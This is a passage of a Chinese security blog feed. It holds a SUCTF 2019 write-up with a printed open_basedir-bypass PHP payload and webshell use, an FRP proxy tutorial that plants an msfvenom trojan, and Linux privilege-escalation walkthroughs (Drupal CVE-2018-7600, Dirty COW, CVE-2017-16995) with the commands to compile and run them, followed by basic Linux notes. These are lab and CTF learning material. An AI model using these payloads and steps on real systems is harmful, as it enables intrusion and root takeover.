alt="image-20220210212639842"></p><p>一句话木马成功利用。</p><p>使用蚁剑成功连接</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212824536.png" alt="image-20220210212824536"></p><p>但是无法访问根目录。</p><p>非预期解：</p><p>采用蚁剑自带插件进行绕过.</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210213427872.png" alt="image-20220210213427872"></p><p>预期解：</p><p>绕过open_basedir</p><p>这里由于涉及的内容我还不太理解，所以这里直接放出payload，有兴趣的大佬可以深入研究一下。</p><pre><code>chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);var_dump(scandir(&quot;/&quot;));</code></pre><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210214135619.png" alt="image-20220210214135619"></p><p>所有文件被列举出来了，下面读取flag值就可以了。</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210214447849.png" alt="image-20220210214447849"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;呜呜呜，我这条懒狗好长时间没刷题了，后面的日子要捡起来了。&lt;/p&gt;
&lt;p&gt;源码贴上来：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150538110.png&quot; alt=&quot;i</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="rce" scheme="https://sakurahack-y.github.io/tags/rce/"/>
    
  </entry>
  
  <entry>
    <title>内网横向代理之FRP</title>
    <link href="https://sakurahack-y.github.io/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/"/>
    <id>https://sakurahack-y.github.io/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/</id>
    <published>2022-01-17T05:27:20.000Z</published>
    <updated>2022-01-19T09:40:34.907Z</updated>
    
    <content type="html"><![CDATA[<p>Frp工具：开源免费，自行搭建，方便修改，成本低，使用多样化，防止隐私泄露。</p><p>工具链接：<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><p>作用:当本机和目标机处于不同内网，借用代理来实现用本机进行内网攻击。</p><p>环境：</p><p>kali2021(本机)  内网ip:192.168.64.128</p><p>centos7.5(服务器) </p><p>windows server 2008 R2 ×64 (目标机)  内网ip:192.168.1.9</p><p>为什么要使用代理?</p><p>两个不同的内网的主机想要通过CS或者MSF等工具实现控制或者通讯是不可能的，必须要借助代理.</p><p>个人认为其根本原因就只有一点：没有独立且确定的公网ip</p><p>如果控制端是外网主机，被控端是内网主机，就相当于控制端有一个唯一的IP地址（比如103.12.4.11），通过这个IP地址就可以找到控制端，而在内网的被控端（比如192.168.23.36），你通过控制端主动去找是找不到的，因为这个内网IP地址并不是唯一的，可能很多内网都用了这个IP地址，你根本没法找。此时就需要反向连接了，让内网的被控端主动去找外网的控制端。而本机和目标机都处于内网之中，此时必须使用代理来进行连接。</p><p>首先配置好环境，kali与win2008处于不同网段，且都可联网。(vm中自行配置，可将一台主机至于NAT模式，一台置于仅主机，使仅主机可联网)</p><p>检测kali的内网ip和网络</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119155315218.png" alt="image-20220119155315218"></p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119155341286.png" alt="image-20220119155341286"></p><p>检测win2008的内网ip和网络.</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119155431599.png" alt="image-20220119155431599"></p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119155453758.png" alt="image-20220119155453758"></p><p>下载frp到kali中</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119155729846.png" alt="image-20220119155729846"></p><p>frpc.ini配置文件是服务端，frpc.ini是客户端，下面进行配置。</p><p>我们首先打开我们的服务器，编辑frps.ini</p><p>随意设置一个端口号就好。</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119162501013.png" alt="image-20220119162501013"></p><p>启动服务端</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119163847158.png" alt="image-20220119163847158"></p><p>接下来在kali中配置控制端</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119164721460.png" alt="image-20220119164721460"></p><p>启动控制端</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119164937708.png" alt="image-20220119164937708"></p><p>接下来利用msfvenom生成木马开启监听</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119171131305.png" alt="image-20220119171131305"></p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119171505986.png" alt="image-20220119171505986"></p><p>将木马上线</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119171914965.png" alt="image-20220119171914965"></p><p>监听到会话</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119173926936.png" alt="image-20220119173926936"></p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119173948480.png" alt="image-20220119173948480"></p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119174002938.png" alt="image-20220119174002938"></p><p>成功实现了内网代理。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Frp工具：开源免费，自行搭建，方便修改，成本低，使用多样化，防止隐私泄露。&lt;/p&gt;
&lt;p&gt;工具链接：&lt;a href=&quot;https://github.com/fatedier/frp&quot;&gt;https://github.com/fatedier/frp&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;作</summary>
      
    
    
    
    <category term="红队" scheme="https://sakurahack-y.github.io/categories/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="代理" scheme="https://sakurahack-y.github.io/categories/%E7%BA%A2%E9%98%9F/%E4%BB%A3%E7%90%86/"/>
    
    
    <category term="代理" scheme="https://sakurahack-y.github.io/tags/%E4%BB%A3%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Linux脏牛提权</title>
    <link href="https://sakurahack-y.github.io/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/"/>
    <id>https://sakurahack-y.github.io/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/</id>
    <published>2022-01-04T06:17:11.000Z</published>
    <updated>2022-03-11T07:12:05.344Z</updated>
    
    <content type="html"><![CDATA[<p>脏牛漏洞，又叫Dirty COW，存在Linux内核中已经有长达9年的时间，在2007年发布的Linux内核版本中就已经存在此漏洞。Linux kernel团队在2016年10月18日已经对此进行了修复。</p><p>漏洞范围：Linux内核 &gt;= 2.6.22（2007年发行，到2016年10月18日才修复）</p><p>简要分析：该漏洞具体为，Linux内核的内存子系统在处理写入复制（copy-on-write, COW）时产生了竞争条件（race condition）。恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问。竞争条件，指的是任务执行顺序异常，可导致应用崩溃，或令攻击者有机可乘，进一步执行其他代码。利用这一漏洞，攻击者可在其目标系统提升权限，甚至可能获得root权限。</p><p>复现：</p><p>环境：Ubuntu 14.04.5</p><p>靶场下载地址:<a href="https://www.vulnhub.com/entry/lampiao-1,249/">Lampião: 1 ~ VulnHub</a></p><p>开启kali，靶机，配置使其位于同一网段</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104144958930.png" alt="image-20220104144958930"></p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104144854766.png" alt="image-20220104144854766"></p><p>使用nmap对ip段进行扫描</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104144833775.png" alt="image-20220104144833775"></p><p>发现可疑ip  192.168.64.129</p><p>打开</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104145052541.png" alt="image-20220104145052541"></p><p>没有发现有用信息，对其端口进行进一步探测</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104145423615.png" alt="image-20220104145423615"></p><p>发现 1898端口</p><p>打开，网页如图</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104145547619.png" alt="image-20220104145547619"></p><p>在底部发现cms为Drupal</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104145621761.png" alt="image-20220104145621761"></p><p>探测其版本为 Drupal7</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104150839353.png" alt="image-20220104150839353"></p><p>百度一下，发现其存在 远程代码执行漏洞 CVE-2018-7600</p><p>打开msf搜索相关漏洞</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104145741167.png" alt="image-20220104145741167"></p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104151550089.png" alt="image-20220104151550089"></p><p>配置参数，进行攻击</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104151627775.png" alt="image-20220104151627775"></p><p>成功！</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104151712264.png" alt="image-20220104151712264"></p><p>下面上传漏洞检测脚本至目标靶机</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104173845980.png" alt="image-20220104173845980"></p><p>赋予权限并运行</p><pre><code>shellchmod +x sakuras.sh./sakuras.sh</code></pre><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104174121444.png" alt="image-20220104174121444"></p><p>发现了脏牛漏洞，准备开始提权</p><p>准备好exp</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104192056147.png" alt="image-20220104192056147"></p><p>链接：<a href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a></p><p>上传 dcow.cpp到靶机 </p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104192200178.png" alt="image-20220104192200178"></p><p>进行编译</p><pre><code>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil</code></pre><p>打开交互式环境</p><pre><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p>运行</p><pre><code>./dcow</code></pre><p>成功</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104192407007.png" alt="image-20220104192407007"></p><p>新建ssh链接，或者直接</p><p>su root </p><p>记得切换用户要在交换式窗口下</p><p>成功提权</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104192533247.png" alt="image-20220104192533247"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;脏牛漏洞，又叫Dirty COW，存在Linux内核中已经有长达9年的时间，在2007年发布的Linux内核版本中就已经存在此漏洞。Linux kernel团队在2016年10月18日已经对此进行了修复。&lt;/p&gt;
&lt;p&gt;漏洞范围：Linux内核 &amp;gt;= 2.6.22（2</summary>
      
    
    
    
    <category term="网络安全" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="Linux提权" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Linux%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="提权" scheme="https://sakurahack-y.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Linux提权本地配合内核漏洞演示</title>
    <link href="https://sakurahack-y.github.io/2022/01/04/Linux%E6%8F%90%E6%9D%83%E6%9C%AC%E5%9C%B0%E9%85%8D%E5%90%88%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/"/>
    <id>https://sakurahack-y.github.io/2022/01/04/Linux%E6%8F%90%E6%9D%83%E6%9C%AC%E5%9C%B0%E9%85%8D%E5%90%88%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/</id>
    <published>2022-01-04T04:00:46.000Z</published>
    <updated>2022-03-11T07:11:43.574Z</updated>
    
    <content type="html"><![CDATA[<p>环境：Ubuntu 16.04(这里直接使用墨者学院的靶场)</p><p>漏洞编号：CVE-2017-16995</p><p>使用工具: linux-exploit-suggester-2 检测     特定exp提权</p><p>工具链接：<a href="https://github.com/jondonas/linux-exploit-suggester-2">GitHub - jondonas/linux-exploit-suggester-2: Next-Generation Linux Kernel Exploit Suggester</a></p><p><img src="/2022/01/04/Linux%E6%8F%90%E6%9D%83%E6%9C%AC%E5%9C%B0%E9%85%8D%E5%90%88%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/image-20220104134814506.png" alt="image-20220104134814506"></p><p>利用ssh工具连接</p><p><img src="/2022/01/04/Linux%E6%8F%90%E6%9D%83%E6%9C%AC%E5%9C%B0%E9%85%8D%E5%90%88%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/image-20220104133116341.png" alt="image-20220104133116341"></p><p>上传工具，并运行，发现有  CVE-2017-16995 漏洞</p><p> Source: <a href="http://www.exploit-db.com/exploits/45010">http://www.exploit-db.com/exploits/45010</a></p><p>下载exp</p><p>得到45010.c</p><p>上传到服务器/tmp目录</p><p>编译执行</p><pre><code>gcc 45010.c -o 455010chmod +x 455010./ 455010</code></pre><p><img src="/2022/01/04/Linux%E6%8F%90%E6%9D%83%E6%9C%AC%E5%9C%B0%E9%85%8D%E5%90%88%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/image-20220104133424470.png" alt="image-20220104133424470"></p><p>成功提权！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;环境：Ubuntu 16.04(这里直接使用墨者学院的靶场)&lt;/p&gt;
&lt;p&gt;漏洞编号：CVE-2017-16995&lt;/p&gt;
&lt;p&gt;使用工具: linux-exploit-suggester-2 检测     特定exp提权&lt;/p&gt;
&lt;p&gt;工具链接：&lt;a href=&quot;http</summary>
      
    
    
    
    <category term="网络安全" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="Linux提权" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Linux%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="提权" scheme="https://sakurahack-y.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Linux</title>
    <link href="https://sakurahack-y.github.io/2021/11/12/Linux/"/>
    <id>https://sakurahack-y.github.io/2021/11/12/Linux/</id>
    <published>2021-11-11T16:09:36.000Z</published>
    <updated>2022-03-11T04:05:55.708Z</updated>
    
    <content type="html"><![CDATA[<h1 id="了解Linux操作系统及安装方式"><a href="#了解Linux操作系统及安装方式" class="headerlink" title="了解Linux操作系统及安装方式"></a>了解Linux操作系统及安装方式</h1><p><img src="/2021/11/12/Linux/image-20211112001054678.png" alt="image-20211112001054678"></p><p><img src="/2021/11/12/Linux/image-20211112001133176.png" alt="image-20211112001133176"></p><p><img src="/2021/11/12/Linux/image-20211112002049844.png" alt="image-20211112002049844"></p><p><img src="/2021/11/12/Linux/image-20211112002148742.png" alt="image-20211112002148742"></p><p><img src="/2021/11/12/Linux/image-20211112002405780.png" alt="image-20211112002405780"></p><h1 id="掌握基础命令、用户帐号管理、目录和文件管理"><a href="#掌握基础命令、用户帐号管理、目录和文件管理" class="headerlink" title="掌握基础命令、用户帐号管理、目录和文件管理"></a>掌握基础命令、用户帐号管理、目录和文件管理</h1><p>命令：</p><p>uname -a  显示主机名、内核版本、硬件平台等详细信息 </p><p>uname -r 显示内核版本</p><p>cat /etc/os-release 查看版本号</p><p>hostname 显示全合格主机名</p><p>cat /proc/cpuinfo  查看cpu信息 或者lscpu</p><p>cat /proc/meminfo 查看内存信息  或者free</p><p>关机 poweroff   shutdown -h now</p><p>重启 reboot  shutdown -r now </p><p>Linux命令</p><p>用于实现某一类功能的指令或者程序</p><p>命令的执行依赖于解释器程序(例如：/bin/bash)</p><p>Linux 命令的分类</p><p>内部命令：属于shell解释器的一部分</p><p>即命令包含在shell程序本身之中，例如”history”命令</p><p>外部命令：独立于shell解释器之外的程序文件。</p><p>如何判断是外部命令还是内部？</p><p>使用：</p><p>which xx</p><p>如果可以搜索到为外部，不能则为内部</p><p>这个方法也用来查找外部命令的路径</p><p>如：</p><p>[root@o213 ~]# which ls<br>/usr/bin/ls</p><p>type  xx 了解一些命令的信息</p><p>如：</p><p>[root@o213 ~]# type ls<br>ls 是“ls –color=auto”的别名</p><p><img src="/2021/11/12/Linux/image-20211112233035921.png" alt="image-20211112233035921"></p><p>命令行编辑的几个辅助操作</p><p>Tab ：自动补齐</p><p>反斜杠 \ :强制换行</p><p>Ctrl+U :清空至行首</p><p>Ctrl+K :清空至行尾</p><p>Ctrl+L：清屏</p><p>Ctrl+C:取消本次命令编辑</p><p>内部命令help</p><p>查看Bash内部命令的帮助信息</p><p>命令的 “–help” 选项</p><p>适用于大多数外部命令</p><p>adduser 添加用户账号</p><p>passwd 设置(更改)用户口令</p><p>userdel 删除用户账号(及宿主目录)</p><p>usermod 设置用户属性</p><p> [root@o213 ~]# adduser admin  //增加用户</p><p>[root@o213 ~]# passwd admin  //修改admin的密码</p><p>[root@o213 ~]# passwd admin<br>更改用户 admin 的密码 。<br>新的密码：<br>重新输入新的密码：<br>passwd：所有的身份验证令牌已经成功更新。</p><p>[root@o213 ~]# usermod -L admin  锁定admin账号<br>[root@o213 ~]# userdel admin 删除admin账号</p><p>用户的账号信息保存在 /etc/passwd  文件中</p><p>tail -1 /etc/passwd   //从后往前显示一行</p><p>用户的加密口令保存在 /etc/shadow  文件中</p><p>tail -1 /etc/shadow</p><p>用户的宿主目录(家目录)在 /home 下</p><p>tail -1 /etc/home</p><p>切换用户</p><p>su admin  //切换到admin用户</p><p>组命令：</p><p>groupadd  添加指定名称的用户组账号</p><p>groupdel  删除指定名称的用户组账号</p><p>文件</p><p>/etc/group  保存用户组账号信息</p><pre><code>groupadd shuihugroupadd honglouuseradd -g shuihu wusong  //创建wusong用户并指定到shuihu组useradd -g honglou jiabaoyu //创建jiaobaoyu组并指定到honglou组groupadd daxia usermod -g daxia wusong //将wusong这个用户从shuihu组移到daxia组groupdel daxia  //删除组</code></pre><p><img src="/2021/11/12/Linux/image-20211113001359900.png" alt="image-20211113001359900"></p><p><img src="/2021/11/12/Linux/image-20211113001715071.png" alt="image-20211113001715071"></p><p>增加文件所有者的执行权限</p><p>chmod u+x anaconda-ks.cfg  </p><p>去除文件所属组的写权限</p><p>chmod g-w lshelp.txt</p><p>设置其他用户的文件权限为可执行</p><p>chmod o=x lshelp.txt</p><p>追加所有账号权限可读</p><p>chmod a+r anaconda-ks.cfg</p><p>chown命令：</p><p>设置文件的所以者为wusong，让所属组也跟着改</p><p>chown wusong:lshelp.txt</p><p>设置文件的所以者为root，所属组不改</p><p>chown root lshelp.txt</p><p>设置文件的所属组</p><p>chown : root lshelp.txt</p><p>查看及切换目录</p><p>pwd、cd、ls、du</p><p>pwd：查看工作目录</p><p>[root@o213 ~]# pwd<br>/root</p><p>cd：切换目录</p><p>cd ~  回家</p><p>ls：显示目录内容</p><p>ls -l:以长格式显示</p><p>ls -a:显示所有子目录和文件的信息，包括隐藏文件</p><p>ls -A:类似于”-a”,但不显示”.”和”..”目录的信息</p><p>ls -d:显示目录本身的属性</p><p>ls -h:以更易读的字节单位(K、M等)显示信息</p><p>ls -R:递归显示内容</p><p>ls –color:以颜色区分不同类型文件</p><p>创建目录和文件</p><p>mkdir、touch、In</p><p>mkdir a/b/c/d  创建多层目录 </p><p>touch aa.txt 创建一个空文件</p><p>ln：为文件或目录建立链接</p><pre><code>[root@o213 ~]# ln -s /usr/bin/ls aa[root@o213 ~]# lsaa  anaconda-ks.cfgln lshelp.txt abc //建立硬链接</code></pre><p>符号链接：指向原始文件所在的路径，又称为软链接</p><p>硬链接：</p><p>指向原始文件对应的数据存储位置</p><p>不能为目录建立硬链接文件</p><p>硬链接与原始文件必须位于同一分区(文件系统)</p><p>可以使用stat命令查看：</p><pre><code>[root@o213 ~]# touch sakura.txt[root@o213 ~]# lsaa  anaconda-ks.cfg  sakura.txt[root@o213 ~]# ln sakura.txt dd[root@o213 ~]# state dd-bash: state：未找到命令[root@o213 ~]# stat dd  文件：dd  大小：0               块：0          IO 块：4096   普通空文件设备：fd00h/64768d      Inode：786445      硬链接：2权限：(0644/-rw-r--r--)  Uid：(    0/    root)   Gid：(    0/    root)环境：unconfined_u:object_r:admin_home_t:s0最近访问：2021-11-13 01:10:30.704162871 +0800最近更改：2021-11-13 01:10:30.704162871 +0800最近改动：2021-11-13 01:10:58.974385168 +0800创建时间：2021-11-13 01:10:30.703162863 +0800[root@o213 ~]# stat sakura.txt  文件：sakura.txt  大小：0               块：0          IO 块：4096   普通空文件设备：fd00h/64768d      Inode：786445      硬链接：2权限：(0644/-rw-r--r--)  Uid：(    0/    root)   Gid：(    0/    root)环境：unconfined_u:object_r:admin_home_t:s0最近访问：2021-11-13 01:10:30.704162871 +0800最近更改：2021-11-13 01:10:30.704162871 +0800最近改动：2021-11-13 01:10:58.974385168 +0800创建时间：2021-11-13 01:10:30.703162863 +0800</code></pre><p>复制、删除、移动目录和文件</p><p>cp、rm、mv</p><p>cp: </p><p>-r：递归复制整个目录树</p><p>-p:保持源文件的属性不变</p><p>-f:强制覆盖目标同名文件或目录</p><p>-i:需要覆盖文件或目录时进行提醒</p><p>查找目录和文件</p><p>which、find</p><p>通配符：</p><p>*  代替零个、单个或多个字符</p><p>?  代替一个字符</p><p>alias 定义别名：</p><p>alias myls=’ls -alh’</p><p>du:</p><p>统计目录及文件的空间占用清空</p><p>-a:统计时包括所有的文件，而不仅仅只统计目录</p><p>-h:以更容读的字节单位(K、M等)显示信息</p><p>-s:只统计每个参数所占用空间的总的大小</p><p>如：</p><p>du -sh /home/</p><pre><code>[root@o213 ~]# du -sh /home/60K     /home/</code></pre><p>find 命令</p><p>比如：</p><p>find /etc -name “re*.conf”</p><p>从/etc 目录找这个文件</p><p>-name:按文件名称查找</p><p>-size:按文件大小查找</p><p>-user：按文件属主查找</p><p>-type：按文件类型查找</p><h1 id="程序安装及管理"><a href="#程序安装及管理" class="headerlink" title="程序安装及管理"></a>程序安装及管理</h1><p><img src="/2021/11/12/Linux/image-20211121230756940.png" alt="image-20211121230756940"></p><p><img src="/2021/11/12/Linux/image-20211121231009685.png" alt="image-20211121231009685"></p><p><img src="/2021/11/12/Linux/image-20211121231235005.png" alt="image-20211121231235005"></p><p><img src="/2021/11/12/Linux/image-20211121231510277.png" alt="image-20211121231510277"></p><p><img src="/2021/11/12/Linux/image-20211121232610276.png" alt="image-20211121232610276"></p><p><img src="/2021/11/12/Linux/image-20211121233634742.png" alt="image-20211121233634742"></p><p><img src="/2021/11/12/Linux/image-20211121233758176.png" alt="image-20211121233758176"></p><p><img src="/2021/11/12/Linux/image-20211121234948834.png" alt="image-20211121234948834"></p><p><img src="/2021/11/12/Linux/image-20211122000239414.png" alt="image-20211122000239414"></p><p><img src="/2021/11/12/Linux/image-20211122001630415.png" alt="image-20211122001630415"></p><h1 id="文本操作和vim编辑器使用"><a href="#文本操作和vim编辑器使用" class="headerlink" title="文本操作和vim编辑器使用"></a>文本操作和vim编辑器使用</h1><p><img src="/2021/11/12/Linux/image-20220308011741913.png" alt="image-20220308011741913"></p><p><img src="/2021/11/12/Linux/image-20220308013931204.png" alt="image-20220308013931204"></p><p><img src="/2021/11/12/Linux/image-20220308014033514.png" alt="image-20220308014033514"></p><p><img src="/2021/11/12/Linux/image-20220308014116929.png" alt="image-20220308014116929"></p><p><img src="/2021/11/12/Linux/image-20220308014233942.png" alt="image-20220308014233942"></p><p><img src="/2021/11/12/Linux/image-20220308014346074.png" alt="image-20220308014346074"></p><p><img src="/2021/11/12/Linux/image-20220308014736434.png" alt="image-20220308014736434"></p><p><img src="/2021/11/12/Linux/image-20220308015054899.png" alt="image-20220308015054899"></p><p><img src="/2021/11/12/Linux/image-20220308015347207.png" alt="image-20220308015347207"></p><p><img src="/2021/11/12/Linux/image-20220308015521810.png" alt="image-20220308015521810"></p><p><img src="/2021/11/12/Linux/image-20220308015748418.png" alt="image-20220308015748418"></p><p><img src="/2021/11/12/Linux/image-20220308015906926.png" alt="image-20220308015906926"></p><p><img src="/2021/11/12/Linux/image-20220308015952657.png" alt="image-20220308015952657"></p><p><img src="/2021/11/12/Linux/image-20220308020112384.png" alt="image-20220308020112384"></p><p><img src="/2021/11/12/Linux/image-20220308020212017.png" alt="image-20220308020212017"></p><h1 id="磁盘及文件系统管理"><a href="#磁盘及文件系统管理" class="headerlink" title="磁盘及文件系统管理"></a>磁盘及文件系统管理</h1><h2 id="磁盘"><a href="#磁盘" class="headerlink" title="磁盘"></a>磁盘</h2><p><img src="/2021/11/12/Linux/image-20220308141343118.png" alt="image-20220308141343118"></p><p><img src="/2021/11/12/Linux/image-20220308141518463.png" alt="image-20220308141518463"></p><p><img src="/2021/11/12/Linux/image-20220308141857925.png" alt="image-20220308141857925"></p><p><img src="/2021/11/12/Linux/image-20220308142045085.png" alt="image-20220308142045085"></p><h2 id="文件系统管理"><a href="#文件系统管理" class="headerlink" title="文件系统管理"></a>文件系统管理</h2><p><img src="/2021/11/12/Linux/image-20220308142954530.png" alt="image-20220308142954530"></p><p><img src="/2021/11/12/Linux/image-20220308143219045.png" alt="image-20220308143219045"></p><p><img src="/2021/11/12/Linux/image-20220308143403587.png" alt="image-20220308143403587"></p><p><img src="/2021/11/12/Linux/image-20220308143815646.png" alt="image-20220308143815646"></p><p><img src="/2021/11/12/Linux/image-20220308144414197.png" alt="image-20220308144414197"></p><p><img src="/2021/11/12/Linux/image-20220308144447054.png" alt="image-20220308144447054"></p><p><img src="/2021/11/12/Linux/image-20220308144514584.png" alt="image-20220308144514584"><img src="/2021/11/12/Linux/image-20220308152536146.png" alt="image-20220308152536146"></p><p><img src="/2021/11/12/Linux/image-20220308152716901.png" alt="image-20220308152716901"></p><h2 id="创建及管理LVM分区"><a href="#创建及管理LVM分区" class="headerlink" title="创建及管理LVM分区"></a>创建及管理LVM分区</h2><p><img src="/2021/11/12/Linux/image-20220308155422503.png" alt="image-20220308155422503"></p><p><img src="/2021/11/12/Linux/image-20220308155512004.png" alt="image-20220308155512004"></p><p><img src="/2021/11/12/Linux/image-20220308155636485.png" alt="image-20220308155636485"></p><p><img src="/2021/11/12/Linux/image-20220308160201334.png" alt="image-20220308160201334"></p><h2 id="磁盘配额"><a href="#磁盘配额" class="headerlink" title="磁盘配额"></a>磁盘配额</h2><p><img src="/2021/11/12/Linux/image-20220308160333556.png" alt="image-20220308160333556"></p><p><img src="/2021/11/12/Linux/image-20220308160444734.png" alt="image-20220308160444734"></p><p><img src="/2021/11/12/Linux/image-20220308160518732.png" alt="image-20220308160518732"></p><p><img src="/2021/11/12/Linux/image-20220308160855222.png" alt="image-20220308160855222"></p><p><img src="/2021/11/12/Linux/image-20220308161316439.png" alt="image-20220308161316439"></p><p><img src="/2021/11/12/Linux/image-20220308161526572.png" alt="image-20220308161526572"></p><p><img src="/2021/11/12/Linux/image-20220308161702971.png" alt="image-20220308161702971"></p><p><img src="/2021/11/12/Linux/image-20220308162017607.png" alt="image-20220308162017607"></p><p><img 